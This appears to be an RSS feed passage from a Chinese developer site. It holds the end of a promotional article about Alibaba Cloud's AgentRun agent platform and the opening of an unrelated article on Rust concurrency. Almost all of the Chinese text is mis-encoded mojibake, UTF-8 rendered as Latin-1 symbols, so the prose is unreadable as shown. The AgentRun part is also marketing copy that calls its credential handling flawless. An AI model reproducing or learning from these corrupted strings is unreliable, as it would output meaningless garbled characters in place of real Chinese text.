<li>æ¨¡å‹æ²»ç†ï¼šé€šè¿‡ç»Ÿä¸€æ¨¡å‹ä»£ç†å±è”½ API å·®å¼‚ï¼Œæä¾›æ¨¡å‹ç†”æ–­ã€å¤šæ¨¡å‹ Fallback å’Œè´Ÿè½½å‡è¡¡ç­‰é«˜å¯ç”¨ä¿éšœï¼Œä»¥åŠå†…å®¹å®¡æ ¸ã€æ•æ„Ÿä¿¡æ¯è¿‡æ»¤ç­‰å®‰å…¨åˆè§„èƒ½åŠ›ã€‚</li>
<li>å·¥å…·æ²»ç†ï¼šé‡‡ç”¨ MCP æ ‡å‡†åŒ–å°è£…ï¼Œæ”¯æŒ MCP å’Œ Function Call åŒåè®®ï¼Œé€šè¿‡æ’ä»¶æœºåˆ¶æä¾›è‡ªå®šä¹‰ Hookã€æ™ºèƒ½è·¯ç”±ã€è¯­ä¹‰åˆ†æç­‰æ‰©å±•åŠŸèƒ½ã€‚</li>
</ul>
<h3 data-id="heading-6">æ ¸å¿ƒåŠŸèƒ½ 4ï¼šå…¨é“¾è·¯å¯è§‚æµ‹</h3>
<p>åŸºäºå…¨é“¾è·¯è¿½è¸ªæŠ€æœ¯ï¼ŒAgentRun å®ç°äº†ä»è¯·æ±‚åˆ°å“åº”çš„å®Œæ•´å¯è§†åŒ–ã€‚ç²¾å‡†è¿˜åŸ Agent çš„å†³ç­–è·¯å¾„ï¼ŒåŒ…æ‹¬æ„å›¾ç†è§£ã€æ¨¡å‹æ¨ç†ã€å·¥å…·è°ƒç”¨åŠçŸ¥è¯†æ£€ç´¢ç­‰æ ¸å¿ƒç¯èŠ‚ï¼Œå¹¶ç›´è§‚å±•ç¤ºæ¯ä¸€æ­¥çš„çŠ¶æ€ä¸è€—æ—¶ã€‚è¿™ä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿå¿«é€Ÿå®šä½æ€§èƒ½ç“¶é¢ˆï¼Œå‘Šåˆ«ç›²ç›®è°ƒè¯•ï¼Œä»è€Œå¤§å¹…é™ä½ä¼˜åŒ–æˆæœ¬ã€‚</p>
<h3 data-id="heading-7">æ ¸å¿ƒåŠŸèƒ½ 5ï¼šç”Ÿæ€å¼€æ”¾ä¸å·¥ç¨‹åŒ–æ¼”è¿›</h3>
<p>æ‹¥æŠ±ç”Ÿæ€ã€å¼€æ”¾ä¸é”å®šæ˜¯ AgentRun çš„è®¾è®¡å“²å­¦ã€‚</p>
<ul>
<li>æ— ç¼é›†æˆä¸šç•Œä¸»æµé«˜ä»£ç æ¡†æ¶ï¼šåªéœ€å‡ è¡Œä»£ç ï¼Œå³å¯å°† AgentRun çš„åŸºç¡€è®¾æ–½é›†æˆåˆ°ä¸šç•Œä¸»æµé«˜ä»£ç æ¡†æ¶ï¼Œå¦‚ AgentScopeã€Langchainã€LlamaIndexã€CrewAIã€Google ADK ç­‰ã€‚</li>
<li>æ— ä»£ç åˆ°é«˜ä»£ç ä¸€é”®è½¬æ¢ï¼šæ”¯æŒæ— ä»£ç å¿«é€Ÿæ­å»º Agent å®ç°ä¸šåŠ¡æ•æ·è½åœ°ã€‚éšç€ä¸šåŠ¡å¤æ‚åº¦æå‡ï¼Œå¹³å°æ”¯æŒå°†å¯è§†åŒ–é…ç½®è½¬åŒ–ä¸ºå·¥ç¨‹åŒ–ä»£ç ï¼Œç»“æ„æ¸…æ™°ã€æ˜“äºç»´æŠ¤ï¼Œè½»æ¾å®ç°ä»æ— ä»£ç åˆ°é«˜ä»£ç çš„ä¸€é”®è½¬æ¢èƒ½åŠ›ï¼Œä»æ ¹æºä¸Šè§„é¿äº†é‡æ„å¸¦æ¥çš„æŠ€æœ¯å€ºåŠ¡ã€‚</li>
<li>æŠ€æœ¯è‡ªä¸»ä¸æ•°æ®å®‰å…¨ï¼šæ·±åº¦é›†æˆ LiteLLMã€Mem0ã€RagFlow ç­‰å¼€æºç”Ÿæ€ç»„ä»¶ï¼Œæä¾›äº‘ç«¯æ‰˜ç®¡æˆ–ç§æœ‰åŒ–éƒ¨ç½²ï¼Œç¡®ä¿æŠ€æœ¯è‡ªä¸»ä¸æ•°æ®å®‰å…¨ã€‚</li>
</ul>
<h2 data-id="heading-8">ä¸‰ä¸ªå®æµ‹åœºæ™¯ï¼šAgentRun èƒ½è§£å†³ä»€ä¹ˆå…·ä½“é—®é¢˜ï¼Ÿ</h2>
<h3 data-id="heading-9">åœºæ™¯1ï¼šä¸æ‡‚ä»£ç ï¼Œä½†å¸Œæœ›åˆ›å»ºç”Ÿäº§çº§ Agent</h3>
<p><em>â€œæˆ‘æ‡‚ä¸šåŠ¡ï¼Œä½†ä¸æ‡‚ä»£ç ï¼Œå°±åº”è¯¥è¢«æŒ¡åœ¨ AI åº”ç”¨å¼€å‘çš„å¤§é—¨ä¹‹å¤–å—ï¼Ÿâ€</em></p>
<p>AgentRun é€šè¿‡æ— ä»£ç /ä½ä»£ç ç”Ÿæˆ Agent çš„æ–¹å¼æ‰“ç ´æŠ€æœ¯å£å’ã€‚è®©ä¸šåŠ¡äººå‘˜æ— éœ€ç¼–å†™ä»»ä½•ä»£ç ï¼Œé€šè¿‡å¯è§†åŒ–ç•Œé¢æˆ–â€œä¸€å¥è¯æè¿°â€ï¼Œå°±èƒ½å³æ—¶åˆ›å»ºå‡ºåŠŸèƒ½å¼ºå¤§çš„ Agentã€‚æ›´é‡è¦çš„æ˜¯ï¼Œæ¯ä¸€ä¸ªÂ Agentã€Sandbox éƒ½èƒ½ä»¥ MCP å½¢å¼æä¾›ï¼Œè®© Agent ä¸ä»…å¯ä»¥è°ƒç”¨å¤–éƒ¨å·¥å…·ï¼Œä¹Ÿèƒ½è°ƒç”¨å…¶ä»– Agentï¼Œå®ç°åƒâ€œä¹é«˜â€ä¸€æ ·ç›¸äº’è°ƒç”¨çš„èƒ½åŠ›ï¼Œç»„åˆå‡ºæ›´å¤æ‚çš„åº”ç”¨ã€‚</p>
<p>ä¸ä»…å¦‚æ­¤ï¼Œéšç€ä¸šåŠ¡å¤æ‚åº¦çš„å‡çº§ï¼Œåªéœ€ä¸€é”®å³å¯å°†æ— ä»£ç  Agent è½¬æ¢ä¸ºé«˜ä»£ç  Agentã€‚æŠ€æœ¯å›¢é˜Ÿå¯ä»¥æ— ç¼æ¥æ‰‹è¿›è¡Œæ·±åº¦å¼€å‘ï¼Œå½»åº•è§£å†³äº†ä½ä»£ç å¹³å°å¸¸è§çš„â€œå¤©èŠ±æ¿â€é—®é¢˜ï¼Œå®ç°äº†ä»å¿«é€ŸéªŒè¯åˆ°ä¸“ä¸šå¼€å‘çš„å¹³æ»‘æ¼”è¿›ã€‚</p>
<h3 data-id="heading-10">åœºæ™¯2ï¼šæµé‡çªå¢ï¼ŒAgent æ¨¡å‹æœåŠ¡ä¸ç¨³å®š</h3>
<p><em>â€œæˆ‘ä¹‹å‰åšè¿‡å¾ˆå¤š AI åº”ç”¨ï¼Œæµé‡å°‘çš„æ—¶å€™è¿˜å¥½ï¼Œæµé‡ä¸€å¤šå°±å¤´ç–¼ï¼Œé™æµã€æ¬ è´¹ã€è¢«å°ï¼Œéšæ—¶ä¼šç˜«ç—ªã€‚â€</em></p>
<p>AgentRun é€šè¿‡æ¨¡å‹æ²»ç†ä¸º Agent åº”ç”¨æä¾›äº†ä¸€ä¸ªâ€œæ™ºèƒ½ä¿é™©ç³»ç»Ÿâ€ã€‚å½“ä¸»æ¨¡å‹å‡ºç°é—®é¢˜æ—¶ï¼Œå¹³å°ä¼šè‡ªåŠ¨ç†”æ–­å¹¶ç§’çº§åˆ‡æ¢åˆ°å¤‡ç”¨æ¨¡å‹ï¼Œå¤šçº§ Fallback æœºåˆ¶ä¿éšœç”Ÿäº§çº§ Agent é«˜å¯ç”¨ã€‚è‡ªåŠ¨ç›‘æ§æ¯ä¸ªæ¨¡å‹çš„å¯ç”¨æ€§ã€å“åº”æ—¶é—´ã€æˆåŠŸç‡ï¼Œæ™ºèƒ½é€‰æ‹©æœ€ä¼˜çš„æ¨¡å‹ã€‚è´Ÿè½½å‡è¡¡èƒ½åŠ›å¯ä»¥é…ç½®å¤šä¸ªæ¨¡å‹å®ä¾‹ï¼Œå°†æµé‡åˆ†å‘åˆ°ä¸åŒçš„è´¦å·ã€ä¸åŒçš„åŒºåŸŸï¼Œé¿å…å•ç‚¹è¿‡è½½ã€‚æˆæœ¬ç›‘æ§ä¼šå®æ—¶è¿½è¸ªæ¯ä¸ªæ¨¡å‹çš„è°ƒç”¨è´¹ç”¨ï¼Œå½“è´¹ç”¨æ¥è¿‘é˜ˆå€¼æ—¶è‡ªåŠ¨é¢„è­¦ï¼Œç”šè‡³å¯ä»¥è‡ªåŠ¨è§¦å‘é™æµæˆ–é™çº§ç­–ç•¥ã€‚å®‰å…¨å›´æ ä¼šåœ¨æ¨¡å‹è°ƒç”¨å‰åè‡ªåŠ¨è¿›è¡Œå†…å®¹å®¡æ ¸å’Œæ•æ„Ÿä¿¡æ¯è¿‡æ»¤ï¼Œç¡®ä¿åˆè§„æ€§ã€‚</p>
<h3 data-id="heading-11">åœºæ™¯3ï¼šå‡­è¯ç®¡ç†ï¼šé›¶ä¿¡ä»»ç¯å¢ƒä¸‹çš„åŠ¨æ€å‡­è¯æ³¨å…¥</h3>
<p><em>â€œå¦‚ä½•åœ¨ä¸æ³„éœ²ç”¨æˆ·å¯†é’¥ï¼ˆAccessKeyï¼‰çš„å‰æä¸‹ï¼Œè®© Agent å®‰å…¨åœ°è°ƒç”¨éœ€è¦æƒé™çš„å·¥å…·ï¼Ÿè¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„å®‰å…¨æŒ‘æˆ˜ã€‚â€</em></p>
<p>AgentRun é¦–åˆ›çš„å‡­è¯ç®¡ç†åŠŸèƒ½ï¼Œé€šè¿‡ Hook æœºåˆ¶å®Œç¾è§£å†³æ ‡å‡† MCP åè®®ä¸æ”¯æŒåŠ¨æ€æ³¨å…¥çš„é—®é¢˜ï¼Œå®ƒå°±åƒä¸€ä¸ªâ€œå®‰å…¨ä¸­ä»‹â€ï¼Œåœ¨ Agent è°ƒç”¨å·¥å…·å‰ï¼ˆå‰ç½® Hookï¼‰ä¼šæ‹¦æˆªè¯·æ±‚ï¼Œæ ¹æ®ç”¨æˆ·èº«ä»½ä»å‡­è¯åº“ä¸­åŠ¨æ€æ³¨å…¥å¯†é’¥ï¼›åœ¨ä»»åŠ¡å®Œæˆåï¼ˆåç½® Hookï¼‰ç«‹å³æ¸…ç†æ‰€æœ‰æ•æ„Ÿä¿¡æ¯å¹¶è®°å½•å®¡è®¡æ—¥å¿—ã€‚æ•´ä¸ªè¿‡ç¨‹ï¼Œå¤§æ¨¡å‹å’Œå¤–éƒ¨ç¯å¢ƒå®Œå…¨æ¥è§¦ä¸åˆ°çœŸå®å¯†é’¥ï¼Œæ— æ‡ˆå¯å‡»ã€‚æ­¤å¤–ï¼ŒAgentRun æ”¯æŒå°†å¤šä¸ª API æ‰“åŒ…æˆä¸€ä¸ª MCP å·¥å…·ï¼Œé€šè¿‡è§„åˆ™è·¯ç”±å’Œæ™ºèƒ½è·¯ç”±èƒ½åŠ›ï¼ŒèŠ‚çº¦æˆæœ¬å’Œæå‡æ€§èƒ½ã€‚</p>
<h3 data-id="heading-12">å‡½æ•°è®¡ç®— AgentRun çš„è½åœ°å®è·µ</h3>
<ul>
<li>æ¨¡å‹æœåŠ¡ï¼šå‡½æ•°è®¡ç®—Â AgentRunä¸å›½å†…æœ€å¤§çš„ AI æ¨¡å‹ç¤¾åŒºÂ ModelScope é­”æ­æ·±åº¦åˆä½œã€‚é€šè¿‡ AgentRunï¼Œå¼€å‘è€…å¯å®ç°ä¸€é”®æ‰˜ç®¡ï¼Œæœ€å¿« 30 ç§’å°†å¼€æºæ¨¡å‹è½¬åŒ–ä¸ºç”Ÿäº§çº§å¯ç”¨ã€å…¼å®¹ OpenAI è§„èŒƒçš„ APIï¼Œæ— éœ€è¿›è¡Œç¹ççš„ç¯å¢ƒæ­å»ºå’Œéƒ¨ç½²ï¼Œå¤§å¹…åŠ é€Ÿäº†ä»æ¨¡å‹åˆ°åº”ç”¨çš„â€œæœ€åä¸€å…¬é‡Œâ€ã€‚å‰åˆ©/ææ°ªç­‰å¤´éƒ¨å‚å•†ï¼Œä¹Ÿå¤§é‡ä½¿ç”¨æ¨¡å‹è¿è¡Œæ—¶æ‰˜ç®¡æ–‡ç”Ÿå›¾ï¼Œæ–‡ç”Ÿè¯­éŸ³ç­‰é¢†åŸŸæ¨¡å‹ï¼Œæ”¯æ’‘æ™ºèƒ½åº§èˆ±ç­‰å…³é”®ä¸šåŠ¡ã€‚</li>
<li>æ™ºèƒ½ä½“åº”ç”¨ï¼šå‡½æ•°è®¡ç®— AgentRun æ”¯æ’‘å¤šå®¶è¡Œä¸šå¤´éƒ¨åŸºç¡€æ¨¡å‹å‚å•†ï¼Œæ„å»ºé¢å‘åƒä¸‡ç”¨æˆ·çš„ C ç«¯æ™ºèƒ½ä½“åº”ç”¨å¦‚ Z.aiã€‚é€šè¿‡ AgentRun æä¾›çš„è™šæ‹Ÿæœºçº§å®‰å…¨éš”ç¦»ã€å¤§è§„æ¨¡å®æ—¶å¼¹æ€§ä»¥åŠå¿™é—²æ™ºèƒ½è®¡è´¹ï¼Œå®Œç¾è§£å†³äº†ç¨€ç–è°ƒç”¨ä¸â€œçˆ†æ¬¾â€æµé‡å¹¶å­˜çš„å¤æ‚åœºæ™¯ï¼Œå®ç°äº†å®‰å…¨ã€ä½“éªŒä¸æˆæœ¬çš„æè‡´å¹³è¡¡ã€‚</li>
<li>AI å·¥å…·ç”Ÿæ€ï¼šå‡½æ•°è®¡ç®— AgentRunÂ ä¸ºé˜¿é‡Œäº‘ç™¾ç‚¼Â MCP Server æä¾› Serverless è¿è¡Œæ—¶åº•åº§ã€‚AgentRun çš„å®ä¾‹ç¼© 0 å’Œé—²ç½®è®¡è´¹ç­‰èƒ½åŠ›ï¼Œè®©è¿™äº›å·¥å…·æœåŠ¡åœ¨æ²¡æœ‰æµé‡æ—¶ï¼Œæˆæœ¬é™ä½ 85%ï¼Œç”šè‡³ä¸º 0ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒQwen æ¨¡å‹è®­ç»ƒä¸­çš„å¼ºåŒ–å­¦ä¹ ä»»åŠ¡ï¼Œé€šè¿‡å‡½æ•°è®¡ç®— Sandbox æ”¯æ’‘è„‰å†²å¼è´Ÿè½½ï¼Œå³°å€¼è§„æ¨¡è¾¾åˆ°æ•°åä¸‡æ ¸ã€‚</li>
</ul>
<h2 data-id="heading-13">ç«‹å³å¼€å§‹ï¼šä¸€æ­¥ä» Demo åˆ°ç”Ÿäº§</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6be9179e70554eeaaa2bcd72b181326b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398398&amp;x-signature=EoZI9nW4ZDdNOHqpQOLpK3eEPCA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ul>
<li>AgentRun æ§åˆ¶å°ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ffunctionai.console.aliyun.com%2Fcn-hangzhou%2Fagent%2Fexplore" target="_blank" title="https://functionai.console.aliyun.com/cn-hangzhou/agent/explore" ref="nofollow noopener noreferrer">functionai.console.aliyun.com/cn-hangzhouâ€¦</a></li>
<li>åŠ å…¥â€œå‡½æ•°è®¡ç®— AgentRun å®¢æˆ·ç¾¤â€é’‰é’‰ç¾¤Â 134570017218Â </li>
</ul>
<h2 data-id="heading-14">æ€»ç»“&amp;å±•æœ›</h2>
<p>AgentRun çš„æ„¿æ™¯å¾ˆç®€å•ï¼š<strong>è®© AI Agent ä» Demo åˆ°ç”Ÿäº§çº§éƒ¨ç½²ï¼Œå˜å¾—å‰æ‰€æœªæœ‰çš„ç®€å•</strong>ã€‚é€šè¿‡ Serverless æ¶æ„æŒç»­ä¼˜åŒ–æˆæœ¬å¹¶è§£æ”¾è¿ç»´è´Ÿæ‹…ï¼Œé€šè¿‡ä¼ä¸šçº§ Runtime æä¾›ç”Ÿäº§çº§çš„æ‰§è¡Œç¯å¢ƒå’Œå®‰å…¨ä¿éšœï¼Œé€šè¿‡å¼€æºç”Ÿæ€é›†æˆé¿å…æ¡†æ¶é”å®šï¼Œé€šè¿‡å…¨é“¾è·¯å¯è§‚æµ‹è®©æ¯ä¸ªç¯èŠ‚éƒ½æ¸…æ™°å¯æ§â€”â€”è¿™å°±æ˜¯ AgentRun è¦ä¸ºä¼ä¸šæä¾›çš„å®Œæ•´è§£å†³æ–¹æ¡ˆã€‚</p>
<p>æˆ‘ä»¬æ·±çŸ¥ï¼ŒAgent åº”ç”¨çš„çœŸæ­£ä»·å€¼ï¼Œä¸åœ¨äºæ¼”ç¤ºæœ‰å¤šç‚«é…·ï¼Œè€Œåœ¨äºèƒ½å¦çœŸæ­£ç¨³å®šã€å®‰å…¨ã€é«˜æ•ˆåœ°ä¸ºä¼ä¸šåˆ›é€ ä»·å€¼ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬æ‰“é€  AgentRun çš„åˆå¿ƒï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æŒç»­æŠ•å…¥å’Œä¼˜åŒ–çš„æ–¹å‘ã€‚æ— è®ºæ‚¨æ˜¯æƒ³å¿«é€ŸéªŒè¯æƒ³æ³•çš„åˆ›ä¸šè€…ï¼Œè¿˜æ˜¯æ„å»ºä¼ä¸šçº§åº”ç”¨çš„å¼€å‘å›¢é˜Ÿï¼ŒAgentRun éƒ½å°†æ˜¯æ‚¨ä»ç¬¬ä¸€è¡Œä»£ç åˆ°ç™¾ä¸‡çº§ç”¨æˆ·ï¼Œå§‹ç»ˆå€¼å¾—ä¿¡èµ–çš„åŸºç¡€è®¾æ–½ä¼™ä¼´ã€‚</p>
<h2 data-id="heading-15">ä¸€å›¾çœ‹æ‡‚ AgentRun ğŸ‘‡</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01b75c8bcfc44001b306840ad84d376d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398398&amp;x-signature=bwVoPKake%2FLX1%2B%2FxTD62kbQ0wyg%3D" alt="å›¾ç‰‡" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[rustå¹¶å‘]]></title>    <link>https://juejin.cn/post/7583878719543558153</link>    <guid>https://juejin.cn/post/7583878719543558153</guid>    <pubDate>2025-12-15T09:54:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583878719543558153" data-draft-id="7581470169840713766" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="rustå¹¶å‘"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T09:54:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ²æ£®"/> <meta itemprop="url" content="https://juejin.cn/user/4455643804079608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            rustå¹¶å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4455643804079608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ²æ£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:54:34.000Z" title="Mon Dec 15 2025 09:54:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»22åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em><strong>å¹¶å‘æ˜¯ä¸€ç§åŒæ—¶å¤„ç†å¾ˆå¤šäº‹æƒ…çš„èƒ½åŠ›ï¼Œå¹¶è¡Œæ˜¯ä¸€ç§åŒæ—¶æ‰§è¡Œå¾ˆå¤šäº‹æƒ…çš„æ‰‹æ®µã€‚</strong></em></p>
<h3 data-id="heading-0">å¹¶å‘çŠ¶æ€ä¸‹å‡ ç§å¸¸è§çš„å·¥ä½œæ¨¡å¼ï¼šè‡ªç”±ç«äº‰æ¨¡å¼ã€map/reduce æ¨¡å¼ã€DAG æ¨¡å¼ï¼š</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3370dc45bcc4b739abfe21cb152ec19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKQ5qOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766397275&amp;x-signature=FZnt1hXwPtAL9LVOOCsB0f920mQ%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨è‡ªç”±ç«äº‰æ¨¡å¼ä¸‹ï¼Œå¤šä¸ªå¹¶å‘ä»»åŠ¡ä¼šç«äº‰åŒä¸€ä¸ªä¸´ç•ŒåŒºçš„è®¿é—®æƒã€‚ä»»åŠ¡ä¹‹é—´åœ¨ä½•æ—¶ã€ä»¥ä½•
ç§æ–¹å¼å»è®¿é—®ä¸´ç•ŒåŒºï¼Œæ˜¯ä¸ç¡®å®šçš„ï¼Œæˆ–è€…è¯´æ˜¯æœ€ä¸ºçµæ´»çš„ï¼Œåªè¦åœ¨è¿›å…¥ä¸´ç•ŒåŒºæ—¶è·å¾—ç‹¬å 
è®¿é—®å³å¯ã€‚
åœ¨è‡ªç”±ç«äº‰çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é™åˆ¶å¹¶å‘çš„åŒæ­¥æ¨¡å¼ï¼Œå…¸å‹çš„æœ‰ map/reduce æ¨¡å¼å’Œ
DAG æ¨¡å¼ã€‚map/reduce æ¨¡å¼ï¼ŒæŠŠå·¥ä½œæ‰“æ•£ï¼ŒæŒ‰ç…§ç›¸åŒçš„å¤„ç†å®Œæˆåï¼Œå†æŒ‰ç…§ä¸€å®šçš„é¡ºåº
å°†ç»“æœç»„ç»‡èµ·æ¥ï¼›DAG æ¨¡å¼ï¼ŒæŠŠå·¥ä½œåˆ‡æˆä¸ç›¸äº¤çš„ã€æœ‰ä¾èµ–å…³ç³»çš„å­ä»»åŠ¡ï¼Œç„¶åæŒ‰ä¾èµ–å…³ç³»å¹¶å‘æ‰§è¡Œã€‚</p>
<p>è¿™ä¸‰ç§åŸºæœ¬æ¨¡å¼ç»„åˆèµ·æ¥ï¼Œå¯ä»¥å¤„ç†éå¸¸å¤æ‚çš„å¹¶å‘åœºæ™¯ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å¤„ç†å¤æ‚é—®é¢˜çš„æ—¶å€™ï¼Œåº”è¯¥å…ˆå˜æ¸…å…¶è„‰ç»œï¼Œç”¨åˆ†æ²»çš„æ€æƒ³æŠŠé—®é¢˜æ‹†è§£æˆæ­£äº¤çš„å­é—®é¢˜ï¼Œç„¶åç»„åˆåˆé€‚çš„å¹¶å‘æ¨¡å¼æ¥å¤„ç†è¿™äº›å­é—®é¢˜ã€‚</p>
<h2 data-id="heading-1">å¹¶å‘åŸè¯­ Atomicã€Mutexã€Condvarã€Channel å’Œ Actor mode</h2>
<h3 data-id="heading-2">Atomic+Compare-and-swap(CAS) (åŸå­æ“ä½œ) â€”â€”Â  <strong>"æé€Ÿä¸”ç‹¬ç«‹çš„å°ä»»åŠ¡"</strong></h3>
